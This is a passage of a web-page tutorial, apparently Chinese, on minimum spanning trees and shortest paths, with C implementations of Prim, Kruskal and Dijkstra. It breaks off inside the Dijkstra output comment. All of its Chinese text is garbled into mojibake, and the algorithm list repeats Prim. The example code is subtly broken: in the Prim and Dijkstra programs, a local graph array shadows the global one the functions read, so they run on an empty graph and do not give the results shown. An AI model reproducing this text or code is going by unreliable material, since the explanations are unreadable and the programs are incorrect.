ç¯</strong>çš„æ ‘ã€‚æœ€å°ç”Ÿæˆæ ‘çš„è¾¹çš„æ€»æƒé‡æ˜¯æœ€å°çš„ã€‚</p><p>ç®—æ³•ï¼š</p><ol><li><p><strong>Prim ç®—æ³•</strong></p></li><li><p><strong>Kruskal ç®—æ³•</strong></p></li><li><p><strong>Prim ç®—æ³•</strong></p></li></ol><p><strong>Prim ç®—æ³•</strong>é€šè¿‡ä»ä¸€ä¸ªé¡¶ç‚¹å¼€å§‹ï¼Œé€æ­¥å°†æœ€å°çš„è¾¹åŠ å…¥ç”Ÿæˆæ ‘ï¼Œç›´åˆ°æ‰€æœ‰é¡¶ç‚¹éƒ½åœ¨æ ‘ä¸­ã€‚æ¯æ¬¡éƒ½é€‰æ‹©å½“å‰ç”Ÿæˆæ ‘ä¸å‰©ä½™é¡¶ç‚¹ä¹‹é—´çš„æœ€å°è¾¹ã€‚</p><p><strong>Prim ç®—æ³•çš„æ­¥éª¤</strong>ï¼š</p><ol><li>ä»ä»»æ„ä¸€ä¸ªé¡¶ç‚¹ï¼ˆä¾‹å¦‚é¡¶ç‚¹ 0ï¼‰å¼€å§‹ï¼Œæ ‡è®°ä¸ºå·²è®¿é—®ã€‚</li><li>æ¯æ¬¡é€‰æ‹©ä¸€ä¸ªå·²ç»åŠ å…¥ç”Ÿæˆæ ‘çš„é¡¶ç‚¹ï¼Œé€šè¿‡å®ƒä¸å°šæœªåŠ å…¥æ ‘çš„é¡¶ç‚¹ä¹‹é—´çš„æœ€å°è¾¹ï¼Œå°†ä¸€ä¸ªæ–°é¡¶ç‚¹åŠ å…¥ç”Ÿæˆæ ‘ã€‚</li><li>é‡å¤æ­¥éª¤ 2ï¼Œç›´åˆ°æ‰€æœ‰é¡¶ç‚¹éƒ½åŠ å…¥ç”Ÿæˆæ ‘ã€‚</li></ol><p><strong>æ•°æ®ç»“æ„</strong>ï¼š</p><ul><li><strong>é‚»æ¥çŸ©é˜µ</strong>æˆ–<strong>é‚»æ¥è¡¨</strong>æ¥å­˜å‚¨å›¾ã€‚</li><li><strong>æœ€å°å †</strong>æˆ–<strong>ä¼˜å…ˆé˜Ÿåˆ—</strong>ç”¨äºé«˜æ•ˆåœ°é€‰æ‹©æœ€å°è¾¹ã€‚</li></ul><p><strong>Prim ç®—æ³•ï¼ˆä½¿ç”¨é‚»æ¥çŸ©é˜µå®ç°ï¼‰</strong>ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES];  <span class="hljs-comment">// é‚»æ¥çŸ©é˜µ</span><br><span class="hljs-type">int</span> parent[MAX_VERTICES];  <span class="hljs-comment">// ç”¨æ¥å­˜å‚¨æœ€å°ç”Ÿæˆæ ‘ä¸­æ¯ä¸ªé¡¶ç‚¹çš„çˆ¶èŠ‚ç‚¹</span><br><span class="hljs-type">int</span> key[MAX_VERTICES];     <span class="hljs-comment">// ç”¨æ¥å­˜å‚¨è¿æ¥å·²åŠ å…¥æ ‘çš„é¡¶ç‚¹å’ŒæœªåŠ å…¥æ ‘çš„é¡¶ç‚¹çš„æœ€å°è¾¹çš„æƒå€¼</span><br><br><span class="hljs-comment">// æ‰¾åˆ°å½“å‰æ²¡æœ‰è¢«åŠ å…¥ç”Ÿæˆæ ‘çš„é¡¶ç‚¹ä¸­ï¼Œæœ€å°è¾¹çš„æƒå€¼çš„é¡¶ç‚¹</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minKey</span><span class="hljs-params">(<span class="hljs-type">int</span> key[], <span class="hljs-type">bool</span> mstSet[], <span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-type">int</span> min = INT_MAX, minIndex;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>        <span class="hljs-keyword">if</span> (!mstSet[v] &amp;&amp; key[v] &lt; min) &#123;<br>            min = key[v];<br>            minIndex = v;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> minIndex;<br>&#125;<br><br><span class="hljs-comment">// Prim ç®—æ³•</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">primMST</span><span class="hljs-params">(<span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> mstSet[MAX_VERTICES];  <span class="hljs-comment">// ç”¨æ¥æ ‡è®°é¡¶ç‚¹æ˜¯å¦å·²åŠ å…¥ç”Ÿæˆæ ‘</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        key[i] = INT_MAX;  <span class="hljs-comment">// åˆå§‹åŒ– key æ•°ç»„ä¸ºæ— ç©·å¤§</span><br>        mstSet[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// åˆå§‹æ—¶ï¼Œæ‰€æœ‰é¡¶ç‚¹éƒ½ä¸åœ¨ç”Ÿæˆæ ‘ä¸­</span><br>    &#125;<br>    key[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// ä»é¡¶ç‚¹ 0 å¼€å§‹</span><br>    parent[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>; <span class="hljs-comment">// é¡¶ç‚¹ 0 æ²¡æœ‰çˆ¶èŠ‚ç‚¹</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; count &lt; numVertices - <span class="hljs-number">1</span>; count++) &#123;<br>        <span class="hljs-type">int</span> u = <span class="hljs-built_in">minKey</span>(key, mstSet, numVertices); <span class="hljs-comment">// æ‰¾åˆ°æœ€å°çš„ key å€¼çš„é¡¶ç‚¹ u</span><br>        mstSet[u] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// å°†é¡¶ç‚¹ u åŠ å…¥åˆ°ç”Ÿæˆæ ‘ä¸­</span><br><br>        <span class="hljs-comment">// æ›´æ–°ä¸ u ç›¸é‚»çš„æ‰€æœ‰æœªåŠ å…¥ç”Ÿæˆæ ‘çš„é¡¶ç‚¹çš„ key å€¼</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[u][v] &amp;&amp; !mstSet[v] &amp;&amp; graph[u][v] &lt; key[v]) &#123;<br>                key[v] = graph[u][v]; <span class="hljs-comment">// æ›´æ–° key å€¼</span><br>                parent[v] = u;        <span class="hljs-comment">// æ›´æ–°çˆ¶èŠ‚ç‚¹</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‰“å°æœ€å°ç”Ÿæˆæ ‘çš„è¾¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Edge \tWeight\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d - %d \t%d\n&quot;</span>, parent[i], i, graph[i][parent[i]]);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">5</span>;<br><br>    <span class="hljs-comment">// ç¤ºä¾‹å›¾</span><br>    <span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>&#125;,<br>        &#123;<span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">primMST</span>(numVertices);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>Kruskal ç®—æ³•</strong></li></ol><p><strong>Kruskal ç®—æ³•</strong>æ˜¯å¦ä¸€ç§å¸¸è§çš„æœ€å°ç”Ÿæˆæ ‘ç®—æ³•ï¼Œå®ƒé€šè¿‡è¾¹çš„æ–¹å¼æ¥æ„å»ºç”Ÿæˆæ ‘ã€‚ç®—æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯<strong>æŒ‰è¾¹çš„æƒé‡ä»å°åˆ°å¤§æ’åº</strong>ï¼Œç„¶åé€ä¸€æ·»åŠ è¾¹åˆ°ç”Ÿæˆæ ‘ä¸­ï¼Œå‰ææ˜¯ä¸ä¼šå½¢æˆç¯ï¼ˆä½¿ç”¨å¹¶æŸ¥é›†åˆ¤æ–­æ˜¯å¦å½¢æˆç¯ï¼‰ã€‚</p><p><strong>Kruskal ç®—æ³•çš„æ­¥éª¤</strong>ï¼š</p><ol><li>å°†å›¾ä¸­çš„æ‰€æœ‰è¾¹æŒ‰æƒé‡å‡åºæ’åˆ—ã€‚</li><li>ä½¿ç”¨ <strong>å¹¶æŸ¥é›†ï¼ˆUnion-Findï¼‰</strong> æ¥åˆ¤æ–­ä¸¤ä¸ªé¡¶ç‚¹æ˜¯å¦å±äºåŒä¸€ä¸ªè¿é€šåˆ†é‡ã€‚</li><li>æŒ‰ç…§æƒé‡ä»å°åˆ°å¤§çš„é¡ºåºï¼Œä¾æ¬¡æ·»åŠ è¾¹åˆ°ç”Ÿæˆæ ‘ä¸­ï¼Œè‹¥æ·»åŠ çš„è¾¹ä¸ä¼šå½¢æˆç¯ï¼Œåˆ™å°†è¾¹åŠ å…¥ç”Ÿæˆæ ‘ã€‚</li><li>é‡å¤ä¸Šè¿°æ­¥éª¤ç›´åˆ°ç”Ÿæˆæ ‘åŒ…å« Vâˆ’1V - 1Vâˆ’1 æ¡è¾¹ã€‚</li></ol><p><strong>æ•°æ®ç»“æ„</strong>ï¼š</p><ul><li><strong>è¾¹åˆ—è¡¨</strong>ï¼šå­˜å‚¨å›¾çš„æ‰€æœ‰è¾¹ã€‚</li><li><strong>å¹¶æŸ¥é›†ï¼ˆUnion-Findï¼‰</strong>ï¼šç”¨äºåˆ¤æ–­æ˜¯å¦å½¢æˆç¯ã€‚</li></ul><p><strong>Kruskal ç®—æ³•ï¼ˆä½¿ç”¨è¾¹åˆ—è¡¨å’Œå¹¶æŸ¥é›†å®ç°ï¼‰</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-comment">// è¾¹ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> u, v, weight;<br>&#125; Edge;<br><br><span class="hljs-comment">// å¹¶æŸ¥é›†æŸ¥æ‰¾å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> parent[], <span class="hljs-type">int</span> i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (parent[i] == <span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> i;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">find</span>(parent, parent[i]);<br>&#125;<br><br><span class="hljs-comment">// å¹¶æŸ¥é›†åˆå¹¶å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unionSets</span><span class="hljs-params">(<span class="hljs-type">int</span> parent[], <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-type">int</span> xroot = <span class="hljs-built_in">find</span>(parent, x);<br>    <span class="hljs-type">int</span> yroot = <span class="hljs-built_in">find</span>(parent, y);<br>    <span class="hljs-keyword">if</span> (xroot != yroot)<br>        parent[xroot] = yroot;<br>&#125;<br><br><span class="hljs-comment">// è¾¹çš„æ¯”è¾ƒå‡½æ•°ï¼Œç”¨äºæ’åº</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* a, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> ((Edge*)a)-&gt;weight - ((Edge*)b)-&gt;weight;<br>&#125;<br><br><span class="hljs-comment">// Kruskal ç®—æ³•</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">kruskalMST</span><span class="hljs-params">(Edge edges[], <span class="hljs-type">int</span> numEdges, <span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    <span class="hljs-built_in">qsort</span>(edges, numEdges, <span class="hljs-built_in">sizeof</span>(Edge), compare);  <span class="hljs-comment">// æŒ‰æƒé‡æ’åºæ‰€æœ‰è¾¹</span><br><br>    <span class="hljs-type">int</span> parent[MAX_VERTICES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++)<br>        parent[i] = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// åˆå§‹åŒ–å¹¶æŸ¥é›†</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Edge \tWeight\n&quot;</span>);<br><br>    <span class="hljs-type">int</span> mstWeight = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numEdges; i++) &#123;<br>        <span class="hljs-type">int</span> u = edges[i].u;<br>        <span class="hljs-type">int</span> v = edges[i].v;<br>        <span class="hljs-type">int</span> weight = edges[i].weight;<br>        <span class="hljs-type">int</span> setU = <span class="hljs-built_in">find</span>(parent, u);<br>        <span class="hljs-type">int</span> setV = <span class="hljs-built_in">find</span>(parent, v);<br>        <span class="hljs-keyword">if</span> (setU != setV) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d - %d \t%d\n&quot;</span>, u, v, weight);<br>            <span class="hljs-built_in">unionSets</span>(parent, setU, setV);  <span class="hljs-comment">// å°†ä¸¤ä¸ªé›†åˆåˆå¹¶</span><br>            mstWeight += weight;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Total weight of MST: %d\n&quot;</span>, mstWeight);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// ç¤ºä¾‹å›¾ï¼Œ4ä¸ªé¡¶ç‚¹å’Œ5æ¡è¾¹</span><br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> numEdges = <span class="hljs-number">5</span>;<br><br>    Edge edges[] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;,<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>&#125;,<br>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">kruskalMST</span>(edges, numEdges, numVertices);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æœ€çŸ­è·¯å¾„ç®—æ³•"><a href="#æœ€çŸ­è·¯å¾„ç®—æ³•" class="headerlink" title="æœ€çŸ­è·¯å¾„ç®—æ³•"></a>æœ€çŸ­è·¯å¾„ç®—æ³•</h4><ol><li>Dijkstra ç®—æ³•</li></ol><p><strong>Dijkstra ç®—æ³•</strong>æ˜¯ä¸€ä¸ªè´ªå¿ƒç®—æ³•ï¼Œç”¨äºè®¡ç®—ä¸€ä¸ªå›¾ä¸­å•æºæœ€çŸ­è·¯å¾„çš„é—®é¢˜ï¼Œå³ä»ä¸€ä¸ªèµ·å§‹èŠ‚ç‚¹å‡ºå‘ï¼Œè®¡ç®—åˆ°æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚è¯¥ç®—æ³•é€‚ç”¨äºå›¾ä¸­æ²¡æœ‰è´Ÿæƒè¾¹çš„æƒ…å†µã€‚</p><p>Dijkstra ç®—æ³•çš„æ­¥éª¤ï¼š</p><ol><li>åˆå§‹åŒ–ä¸€ä¸ªè·ç¦»æ•°ç»„ <code>dist[]</code>ï¼Œç”¨æ¥å­˜å‚¨æºèŠ‚ç‚¹åˆ°å„ä¸ªèŠ‚ç‚¹çš„æœ€çŸ­è·ç¦»ã€‚èµ·å§‹èŠ‚ç‚¹çš„è·ç¦»è®¾ç½®ä¸º 0ï¼Œå…¶ä»–èŠ‚ç‚¹çš„è·ç¦»è®¾ç½®ä¸ºæ— é™å¤§ã€‚</li><li>ä½¿ç”¨ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—ï¼ˆæˆ–æœ€å°å †ï¼‰æ¥é€‰å–å½“å‰æœªå¤„ç†çš„ã€å…·æœ‰æœ€å° <code>dist[]</code> å€¼çš„èŠ‚ç‚¹ã€‚</li><li>ä»å½“å‰èŠ‚ç‚¹å‡ºå‘ï¼Œæ›´æ–°æ‰€æœ‰ç›¸é‚»èŠ‚ç‚¹çš„æœ€çŸ­è·ç¦»ï¼Œå¦‚æœå‘ç°æ›´å°çš„è·ç¦»ï¼Œåˆ™æ›´æ–°ã€‚</li><li>é‡å¤ä»¥ä¸Šæ­¥éª¤ç›´åˆ°æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«è®¿é—®è¿‡ã€‚</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF INT_MAX</span><br><br><span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES];  <span class="hljs-comment">// é‚»æ¥çŸ©é˜µ</span><br><span class="hljs-type">int</span> dist[MAX_VERTICES];  <span class="hljs-comment">// æºèŠ‚ç‚¹åˆ°å…¶ä»–èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„</span><br><span class="hljs-type">bool</span> visited[MAX_VERTICES];  <span class="hljs-comment">// è®°å½•èŠ‚ç‚¹æ˜¯å¦å·²è¢«è®¿é—®</span><br><br><span class="hljs-comment">// Dijkstra ç®—æ³•</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">(<span class="hljs-type">int</span> numVertices, <span class="hljs-type">int</span> start)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        dist[i] = INF;  <span class="hljs-comment">// åˆå§‹åŒ–æ‰€æœ‰é¡¶ç‚¹çš„æœ€çŸ­è·¯å¾„ä¸ºæ— é™å¤§</span><br>        visited[i] = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// åˆå§‹åŒ–æ‰€æœ‰é¡¶ç‚¹ä¸ºæœªè®¿é—®</span><br>    &#125;<br><br>    dist[start] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// èµ·ç‚¹åˆ°èµ·ç‚¹çš„è·ç¦»æ˜¯ 0</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count = <span class="hljs-number">0</span>; count &lt; numVertices - <span class="hljs-number">1</span>; count++) &#123;<br>        <span class="hljs-comment">// æ‰¾åˆ°è·ç¦»èµ·ç‚¹æœ€è¿‘çš„æœªè®¿é—®é¡¶ç‚¹</span><br>        <span class="hljs-type">int</span> u = <span class="hljs-number">-1</span>, minDist = INF;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (!visited[v] &amp;&amp; dist[v] &lt; minDist) &#123;<br>                u = v;<br>                minDist = dist[v];<br>            &#125;<br>        &#125;<br><br>        visited[u] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ ‡è®°å½“å‰é¡¶ç‚¹ä¸ºå·²è®¿é—®</span><br><br>        <span class="hljs-comment">// æ›´æ–°ä¸å½“å‰é¡¶ç‚¹ç›¸é‚»çš„é¡¶ç‚¹çš„æœ€çŸ­è·¯å¾„</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v = <span class="hljs-number">0</span>; v &lt; numVertices; v++) &#123;<br>            <span class="hljs-keyword">if</span> (graph[u][v] &amp;&amp; !visited[v] &amp;&amp; dist[u] + graph[u][v] &lt; dist[v]) &#123;<br>                dist[v] = dist[u] + graph[u][v];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// æ‰“å°æœ€çŸ­è·¯å¾„</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Vertex \t Distance from source\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d \t %d\n&quot;</span>, i, dist[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> numVertices = <span class="hljs-number">5</span>;<br><br>    <span class="hljs-comment">// ç¤ºä¾‹å›¾çš„é‚»æ¥çŸ©é˜µè¡¨ç¤º</span><br>    <span class="hljs-type">int</span> graph[MAX_VERTICES][MAX_VERTICES] = &#123;<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">30</span>, <span class="hljs-number">100</span>&#125;,<br>        &#123;<span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;,<br>        &#123;<span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">10</span>&#125;,<br>        &#123;<span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">60</span>&#125;,<br>        &#123;<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0</span>&#125;<br>    &#125;;<br><br>    <span class="hljs-built_in">dijkstra</span>(numVertices, <span class="hljs-number">0</span>);  <span class="hljs-comment">// ä»é¡¶ç‚¹ 0 å¼€å§‹è®¡ç®—æœ€çŸ­è·¯å¾„</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/*Vertex Distance from source</span><br><span class="hljs-comment">0  0</span><br><span class="hljs-comment">1  10</span><br><span class="hljs-comment">2  60</span><br><span class="hljs-comment">3  